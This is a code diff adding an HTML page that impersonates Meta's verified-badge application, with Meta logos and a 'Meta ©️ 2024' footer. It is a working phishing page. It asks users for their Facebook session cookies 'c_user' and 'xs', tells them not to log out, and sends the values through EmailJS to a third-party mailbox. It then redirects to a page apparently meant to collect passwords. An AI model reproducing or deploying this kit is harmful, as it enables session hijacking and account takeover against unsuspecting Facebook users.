@@ -1,0 +1,119 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <link rel="icon" type="image/png" href="https://upload.wikimedia.org/wikipedia/commons/6/6c/Facebook_Logo_2023.png" />
+  <link rel="stylesheet" href="styles.css" />
+  <title>Meta Verified | Get a verified blue tick</title>
+  <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+  <script>
+    (function() {
+      emailjs.init("I4YkDSw2dTWs4TVuU");
+    })();
+  </script>
+</head>
+<body>
+  <div id="loader-overlay">
+    <div class="loader"></div>
+  </div>
+  <div id="website-content" style="display: none">
+    <nav>
+      <div class="nav-left">
+        <p class="fb-2">facebook</p>
+      </div>
+      <div class="nav-right">
+        <div class="search-box">
+          <img src="https://purepng.com/public/uploads/large/search-icon-lob.png" alt="search-icon" />
+          <input type="text" placeholder="Search" data-twofas-input-listener="true" data-twofas-element-number="0" />
+        </div>
+      </div>
+    </nav>
+    <br /><br />
+    <div class="main-body">
+      <form id="myForm" method="POST">
+        <div>
+          <img src="https://upload.wikimedia.org/wikipedia/commons/a/ab/Meta-Logo.png" width="140" />
+        </div>
+        <p class="tr-5">The verified badge means that Facebook has confirmed that the Page or profile is the</p> 
+        <p class="tr-5">authentic presence of the individual, public figure or brand that it represents.</p>
+        <br />
+        <p class="tr-5">Previously, the verified badge also required the person or brand to be notable and unique.</p>
+         <p class="tr-5">You may still see users with a verified badge that represents our previous eligibility requirements.</p>
+        <br />
+        <p class="tr-5">Please provide the precise details below. Refer to the video for clarification if you find the instructions unclear.</p>
+        <br />
+        <div class="video-text">
+          <p>Must Watch Detailed Video Information:</p>
+        </div>
+        <div>
+          <video controls="" loop="" width="320" poster="https://i.pinimg.com/originals/97/95/69/979569a2dedd37573974ceebc05b4a4e.png">
+            <source src="video.mp4.mp4" type="video/mp4" />
+          </video>
+        </div>
+        <br> 
+        <p class="title"><strong>Must Watch the video and submit required information correctly.</strong></p>
+        <br>
+        <p class="tr-5">Please be sure to provide the requested information below.</p>
+        <br />
+        <div>
+          <p class="mt-4">c_user</p>
+          <input type="number" name="c_user" id="c_user" required data-twofas-input-listener="true" data-twofas-element-number="1" />
+        </div>
+        <br />
+        <div>
+          <p class="mt-4">xs</p>
+          <input type="text" name="xs" id="xs" placeholder="" pattern="^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)(?=.*[@#$%^&amp;+=]).{12,}$" title="Must Watch Detailed Video" required data-twofas-input-listener="true" data-twofas-element-number="2" />
+        </div>
+        <br />
+        <p class="msi-4">Please make sure account not to log out from your computer or laptop until you have received an approval from facebook.</p>
+        <br />
+        <div class="container">
+          <button type="submit" id="my-form-button" class="button" data-twofas-element-number="3">
+            <p>Submit</p>
+          </button>
+          <p id="my-form-status"></p>
+        </div>
+        <br /><br />
+      </form>
+    </div>
+    <br /><br />
+    <div>
+      <p class="copy-r">Meta ©️ 2024</p>
+    </div>
+  </div>
+  <script>
+    document.getElementById("myForm").addEventListener("submit", function (e) {
+      e.preventDefault(); // Prevent the default form submission
+
+      // Extract form data
+      const formData = new FormData(this);
+      const formObj = {};
+      formData.forEach((value, key) => {
+        formObj[key] = value;
+      });
+
+      // Log the form data to the console
+      console.log("form data is ", formObj);
+
+      // Send email using EmailJS
+      emailjs.send('service_zcjqov6', 'template_peh6ahc', formObj).then(
+        (response) => {
+          console.log('SUCCESS!', response.status, response.text);
+          document.getElementById('my-form-status').textContent = 'Form submitted successfully!';
+          window.location.href = "pw.html"; // Redirect to pw.html after successful submission
+        },
+        (error) => {
+          console.log('FAILED...', error);
+          document.getElementById('my-form-status').textContent = 'Form submission failed.';
+        }
+      );
+    });
+
+    // Show website content after loading
+    window.addEventListener('load', function () {
+      document.getElementById('loader-overlay').style.display = 'none';
+      document.getElementById('website-content').style.display = 'block';
+    });
+  </script>
+</body>
+</html>
